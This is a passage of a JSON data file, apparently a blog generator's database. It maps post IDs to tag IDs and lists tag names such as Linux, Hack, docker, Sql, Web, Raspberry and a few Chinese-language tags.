d":"civym301o001vcdon5k8txqtj"},{"post_id":"civym30120012cdonqr1a0dlh","tag_id":"civym301m001tcdond4pujrt1","_id":"civym301q0021cdon435ac3co"},{"post_id":"civym30150014cdond8ck5187","tag_id":"civym301p001ycdonkd3iqm9j","_id":"civym301t0026cdonqu7rp5t6"},{"post_id":"civym301s0025cdonkqxsk9ox","tag_id":"civym300f000bcdonsrz4vms6","_id":"civym301y0029cdonqyks5xfw"},{"post_id":"civym30170017cdonzyn2h86c","tag_id":"civym301s0024cdonurdnaujr","_id":"civym301z002ccdon6s4tkv44"},{"post_id":"civym301a001ccdonqed16spk","tag_id":"civym301y002acdonxyecv01u","_id":"civym3020002hcdonjj238yvm"},{"post_id":"civym301c001ecdonu7jpilkj","tag_id":"civym3020002fcdonsy0ev0oy","_id":"civym3020002kcdonxto1wgjx"},{"post_id":"civym301f001kcdonzl1309z9","tag_id":"civym3020002icdon32amdli2","_id":"civym3021002mcdon5ux6uu0m"},{"post_id":"civym301k001pcdon5enqatvd","tag_id":"civym301y002acdonxyecv01u","_id":"civym3021002ocdonzui4d1dq"},{"post_id":"civym301l001rcdonbasj5we4","tag_id":"civym3020002icdon32amdli2","_id":"civym3022002qcdon4401alio"},{"post_id":"civym301n001ucdonnpn7m1sn","tag_id":"civym3021002pcdonmlm55dzg","_id":"civym3023002scdon7tk9jox0"},{"post_id":"civym301o001xcdon22ahbwc8","tag_id":"civym3020002icdon32amdli2","_id":"civym3024002ucdonift7diqv"},{"post_id":"civym301p0020cdon4qovu2hh","tag_id":"civym3023002tcdon5fo7nuia","_id":"civym3025002wcdonzm48mjtf"},{"post_id":"civym301q0023cdonu8svoxeu","tag_id":"civym3020002icdon32amdli2","_id":"civym3026002ycdonabdy0hxs"},{"post_id":"civym301t0027cdonz0kj5lou","tag_id":"civym3020002icdon32amdli2","_id":"civym3027002zcdon388sjdqt"},{"post_id":"civym30360031cdon6zinl5ht","tag_id":"civym301y002acdonxyecv01u","_id":"civym30370032cdong51lba2n"}],"Tag":[{"name":"Linux","_id":"civym30060006cdonzu152yen"},{"name":"Hack","_id":"civym300f000bcdonsrz4vms6"},{"name":"github","_id":"civym300o000gcdonb4edc6fy"},{"name":"docker","_id":"civym300r000mcdoniuglw2uo"},{"name":"Mac","_id":"civym30110011cdonxfaxlsnk"},{"name":"hack","_id":"civym30180019cdon130gtct6"},{"name":"Github","_id":"civym301m001tcdond4pujrt1"},{"name":"Sql","_id":"civym301p001ycdonkd3iqm9j"},{"name":"docker sql-server","_id":"civym301s0024cdonurdnaujr"},{"name":"Web","_id":"civym301y002acdonxyecv01u"},{"name":"杂谈","_id":"civym3020002fcdonsy0ev0oy"},{"name":"Raspberry","_id":"civym3020002icdon32amdli2"},{"name":"其他","_id":"civym3021002pcdonmlm55dzg"},{"name":"笑话","_id":"civym3023002tcdon5fo7nuia"}]}}